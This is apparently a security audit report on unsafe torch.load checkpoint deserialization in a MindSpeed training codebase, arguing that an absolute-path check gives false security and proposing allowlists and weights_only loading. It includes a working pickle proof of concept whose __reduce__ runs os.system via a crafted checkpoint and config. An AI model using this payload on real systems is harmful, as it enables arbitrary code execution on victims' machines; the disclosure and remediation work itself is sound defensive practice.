# VULN-CROSS-CHKPT-001: Checkpoint Loading Defense-in-Depth Failure

## Summary

**Vulnerability Type:** Deserialization Chain (CWE-502)  
**Severity:** Critical  
**Confidence:** 92%  
**Related:** VULN-CROSS-TORCH-LOAD-001

This vulnerability identifies a **defense-in-depth failure** in the checkpoint loading mechanism. While VULN-CROSS-TORCH-LOAD-001 documents the core deserialization vulnerabilities, this report focuses on the **incomplete and misdirected validation logic** that creates a false sense of security.

---

## Core Finding: Validation-Execution Gap

The codebase attempts to validate checkpoint paths but fails to provide effective protection due to **validation-execution separation**:

### Validation Location #1: Absolute Path Check (Ineffective)

**File:** `mindspeed/core/distributed/layerzero/config.py:266-270`

```python
if config.ckpt_load_path is not None:
    if not os.path.isabs(config.ckpt_load_path):
        raise ValueError(
            f"Checkpoint path must be an absolute path, the current path: {config.ckpt_load_path}"
        )
    load_layerzero_checkpoint(
        zero_models, config.ckpt_load_path, optimizer, opt_param_scheduler)
```

**Problem:** This only validates that the path is absolute, not that it's safe. An attacker-controlled absolute path like `/tmp/malicious/checkpoint` passes validation.

**Data Flow After Validation:**
```
config.ckpt_load_path (validated as absolute)
    ↓
load_layerzero_checkpoint() in mga_checkpoint.py
    ↓
sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
    ↓
torch.load(sd_file)  # VULNERABLE - no re-validation
```

### Vulnerable Execution Points

| File | Line | Code | Validation Status |
|------|------|------|-------------------|
| `checkpointing.py` | 277 | `torch.load(checkpoint_name, ...)` | **NO VALIDATION** |
| `checkpointing.py` | 284 | `torch.load(checkpoint_name + ".ema", ...)` | **NO VALIDATION** |
| `checkpointing.py` | 310 | `torch.load(checkpoint_name, ...)` | **NO VALIDATION** |
| `mga_checkpoint.py` | 188 | `torch.load(sd_file)` | **DISTANT VALIDATION** |
| `layerzero_checkpointer.py` | 55 | `torch.load(self.filename, ...)` | **NO VALIDATION** |
| `layerzero_checkpointer.py` | 110 | `torch.load(self.file_list[0], ...)` | **NO VALIDATION** |
| `layerzero_checkpointer.py` | 127 | `torch.load(self.mp_rank_files[0], ...)` | **NO VALIDATION** |
| `layerzero_checkpointer.py` | 135 | `torch.load(self.mp_rank_files[0], ...)` | **NO VALIDATION** |

---

## Attack Scenario: Defense Bypass

### Scenario: Absolute Path Does Not Mean Safe Path

**Step 1:** Attacker places malicious checkpoint at an absolute path
```bash
# Attacker-controlled location (absolute path)
/tmp/malicious/model_0.pt
```

**Step 2:** Attacker crafts LayerZero config
```yaml
# layerzero_config.yaml
ckpt_load_path: "/tmp/malicious"
```

**Step 3:** Validation passes (path is absolute)
```python
# config.py:266-270
if not os.path.isabs(config.ckpt_load_path):  # FALSE - path is absolute
    raise ValueError(...)
# Validation passes, execution continues
```

**Step 4:** Malicious checkpoint loaded
```python
# mga_checkpoint.py:188
sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
state_dict = torch.load(sd_file)  # Arbitrary code execution
```

**Result:** The absolute path validation provides **zero protection** against:
- Symlink attacks
- Path traversal after validation
- Malicious files at legitimate absolute paths
- Compromised checkpoint directories

---

## Comparison: Effective vs. Ineffective Validation

### Ineffective (Current Implementation)

```python
# Only checks if path is absolute
if not os.path.isabs(config.ckpt_load_path):
    raise ValueError("Must be absolute path")
# Attacker bypasses: /tmp/malicious passes check
```

### Effective (Recommended)

```python
# Check against allowlist of safe directories
ALLOWED_CHECKPOINT_DIRS = [
    "/data/checkpoints",
    "/models/pretrained",
    # ...
]

def validate_checkpoint_path(path):
    real_path = os.path.realpath(path)  # Resolve symlinks
    if not any(real_path.startswith(allowed) for allowed in ALLOWED_CHECKPOINT_DIRS):
        raise SecurityError(f"Checkpoint path not in allowed directories: {path}")
    if not os.path.exists(real_path):
        raise FileNotFoundError(f"Checkpoint not found: {path}")
    # Add hash verification for critical checkpoints
    return real_path
```

---

## Root Cause: Defense Fragmentation

### Issue 1: Validation Point vs. Vulnerability Point Separation

```
┌─────────────────────────────────────────────────────────────────┐
│  config.py:266-270                                             │
│  VALIDATION: os.path.isabs(ckpt_load_path)                     │
│  STATUS: Ineffective - absolute ≠ safe                         │
└─────────────────────────────────────────────────────────────────┘
                          ↓
                          ↓ Distance: Multiple function calls
                          ↓
┌─────────────────────────────────────────────────────────────────┐
│  mga_checkpoint.py:188                                          │
│  VULNERABILITY: torch.load(sd_file)                             │
│  STATUS: No weights_only, no path re-validation                │
└─────────────────────────────────────────────────────────────────┘
```

### Issue 2: Missing Validation for CLI Arguments

```python
# checkpointing.py - No validation at all
def _load_base_checkpoint(load_dir, rank0=False, ...):
    # load_dir comes directly from args.load (CLI)
    # NO VALIDATION
    checkpoint_name = get_checkpoint_name(load_dir, iteration, release)
    state_dict = torch.load(checkpoint_name, ...)  # VULNERABLE
```

### Issue 3: Tool-Specific Loading Lacks Validation

```python
# layerzero_checkpointer.py - Used by convert_to_megatron.py
# No validation at all - accepts any directory
class LayerzeroCheckpoint(object):
    def __init__(self, ckpt_dir):
        self.ckpt_dir = ckpt_dir
        self.file_list = self._get_files_by_key(ckpt_dir, MODEL_FILE_KEY)
        # ...
        state_dict = torch.load(self.filename, ...)  # VULNERABLE
```

---

## Complete Attack Surface Map

```
                    ┌──────────────────────────────────┐
                    │      Attack Entry Points         │
                    └──────────────────────────────────┘
                                    │
            ┌───────────────────────┼───────────────────────┐
            │                       │                       │
            ▼                       ▼                       ▼
    ┌───────────────┐    ┌───────────────────┐    ┌─────────────────────┐
    │ CLI Argument  │    │ LayerZero Config  │    │ Conversion Tool     │
    │ --load        │    │ ckpt_load_path    │    │ --input_folder      │
    └───────┬───────┘    └─────────┬─────────┘    └──────────┬──────────┘
            │                      │                         │
            │ NO VALIDATION        │ Ineffective            │ NO VALIDATION
            │                      │ Validation             │
            ▼                      ▼                         ▼
    ┌───────────────┐    ┌───────────────────┐    ┌─────────────────────┐
    │checkpointing. │    │ mga_checkpoint.py │    │layerzero_           │
    │py:277,284,310 │    │ :188              │    │checkpointer.py      │
    │               │    │                   │    │:55,110,127,135      │
    │ torch.load()  │    │ torch.load()      │    │ torch.load()        │
    └───────────────┘    └───────────────────┘    └─────────────────────┘
            │                      │                         │
            └──────────────────────┼─────────────────────────┘
                                   ▼
                    ┌──────────────────────────────────┐
                    │     Arbitrary Code Execution     │
                    │     (CWE-502 Deserialization)    │
                    └──────────────────────────────────┘
```

---

## Proof of Concept: Bypass Absolute Path Check

### PoC Code

```python
import torch
import os
import pickle

# Create malicious payload
class RCEPayload:
    def __reduce__(self):
        return (os.system, ('id > /tmp/exploited',))

# Create checkpoint with payload
malicious_checkpoint = {
    'model': {'weight': torch.randn(10, 10)},
    'iteration': 1000,
    'parallel_state': {'tp_rank': 0, 'pp_rank': 0},
    'shard_state_dict': {},
    '__reduce_hook__': RCEPayload()
}

# Save at ABSOLUTE PATH (bypasses validation)
os.makedirs('/tmp/evil_checkpoint', exist_ok=True)
torch.save(malicious_checkpoint, '/tmp/evil_checkpoint/model_0.pt')
print("[*] Malicious checkpoint created at absolute path")
print("[*] This path passes config.py validation: os.path.isabs('/tmp/evil_checkpoint') == True")
```

### Exploitation

```yaml
# layerzero_config.yaml
ckpt_load_path: "/tmp/evil_checkpoint"
```

```bash
# Training with malicious config
python train.py --layerzero-config layerzero_config.yaml
# Result: Arbitrary code executed during checkpoint load
# Check: cat /tmp/exploited
```

---

## Remediation Strategy

### Phase 1: Immediate Mitigation (Critical)

Add `weights_only=True` to all `torch.load()` calls - see VULN-CROSS-TORCH-LOAD-001 for complete patch locations.

### Phase 2: Validation at Point-of-Use (High Priority)

Move validation to the actual loading point:

```python
# mga_checkpoint.py:177-188 (AFTER FIX)
def load_layerzero_checkpoint(models, ckpt_dir, optimizer=None, opt_param_scheduler=None):
    # Validate at point of use, not in distant config
    ckpt_dir = validate_checkpoint_path(ckpt_dir)  # NEW
    
    sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
    if not os.path.exists(sd_file):
        raise FileNotFoundError(...)
    
    state_dict = torch.load(sd_file, weights_only=True)  # SECURE
```

### Phase 3: Comprehensive Path Allowlist (Medium Priority)

```python
# mindspeed/security/checkpoint_validator.py (NEW FILE)
import os
from typing import List

class CheckpointSecurityError(Exception):
    """Raised when checkpoint path fails security validation."""
    pass

def validate_checkpoint_path(path: str, allowed_dirs: List[str] = None) -> str:
    """
    Validate checkpoint path against security policy.
    
    Args:
        path: Path to checkpoint file or directory
        allowed_dirs: List of allowed base directories. If None, uses defaults.
    
    Returns:
        Normalized, validated path
    
    Raises:
        CheckpointSecurityError: If path validation fails
    """
    if allowed_dirs is None:
        allowed_dirs = _get_default_allowed_dirs()
    
    # Resolve to canonical path (follows symlinks, removes .., etc.)
    real_path = os.path.realpath(path)
    
    # Check against allowlist
    if not any(real_path.startswith(allowed) for allowed in allowed_dirs):
        raise CheckpointSecurityError(
            f"Checkpoint path '{path}' resolves to '{real_path}' "
            f"which is not in allowed directories: {allowed_dirs}"
        )
    
    # Check existence
    if not os.path.exists(real_path):
        raise FileNotFoundError(f"Checkpoint not found: {real_path}")
    
    return real_path

def _get_default_allowed_dirs():
    """Get default allowed checkpoint directories."""
    import os
    return [
        os.path.expanduser("~/.cache/torch/checkpoints"),
        "/data/checkpoints",
        "/models",
        "/opt/checkpoints",
        # Add project-specific directories
    ]
```

### Phase 4: Secure Loading Wrapper

```python
# mindspeed/checkpointing.py (ENHANCED)
from mindspeed.security.checkpoint_validator import validate_checkpoint_path

def secure_torch_load(path, **kwargs):
    """
    Secure wrapper around torch.load with mandatory validation.
    
    This function MUST be used instead of torch.load for checkpoint loading.
    """
    # Force weights_only=True unless explicitly overridden for compatibility
    if 'weights_only' not in kwargs:
        kwargs['weights_only'] = True
    
    # Validate path before loading
    validated_path = validate_checkpoint_path(path)
    
    # Log for audit
    import logging
    logging.info(f"Loading checkpoint from validated path: {validated_path}")
    
    return torch.load(validated_path, **kwargs)
```

---

## Testing Recommendations

### Security Test Cases

1. **Test Absolute Path Bypass:**
   ```python
   def test_absolute_path_bypass():
       """Verify that absolute paths outside allowed dirs are rejected."""
       malicious_path = "/tmp/malicious_checkpoint"
       with pytest.raises(CheckpointSecurityError):
           validate_checkpoint_path(malicious_path)
   ```

2. **Test Symlink Attack:**
   ```python
   def test_symlink_attack():
       """Verify that symlink traversal is blocked."""
       os.symlink("/etc/passwd", "/tmp/fake_checkpoint")
       with pytest.raises(CheckpointSecurityError):
           validate_checkpoint_path("/tmp/fake_checkpoint")
   ```

3. **Test weights_only Enforcement:**
   ```python
   def test_weights_only_enforcement():
       """Verify that pickle payloads are rejected."""
       create_malicious_checkpoint("/allowed/model.pt")
       with pytest.raises(pickle.UnpicklingError):
           secure_torch_load("/allowed/model.pt")
   ```

---

## References

- **Related Vulnerability:** VULN-CROSS-TORCH-LOAD-001 (core deserialization issue)
- CWE-502: Deserialization of Untrusted Data
- CWE-863: Incorrect Authorization
- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- Defense in Depth: https://owasp.org/www-community/Defense_in_depth

---

## Timeline

- **Discovery:** Static analysis identified torch.load calls without weights_only
- **Analysis:** Cross-module review revealed validation-execution gap
- **Classification:** Critical severity due to defense-in-depth failure
- **Status:** Confirmed vulnerability - requires immediate remediation

---

## Conclusion

The absolute path validation in `config.py` provides a **false sense of security**. The validation:

1. **Is misplaced** - Far from the actual vulnerability point
2. **Is insufficient** - Absolute paths can still be malicious
3. **Creates gaps** - Multiple entry points lack any validation
4. **Misleads developers** - May give impression of protection

**Combined with VULN-CROSS-TORCH-LOAD-001**, this creates a critical vulnerability chain where:
1. Incomplete validation passes attacker-controlled paths
2. Distant validation allows bypass through multiple entry points
3. Unprotected torch.load calls execute arbitrary code

**Recommendation:** Implement the multi-phase remediation strategy outlined above, prioritizing the addition of `weights_only=True` (Phase 1) followed by point-of-use validation (Phase 2).
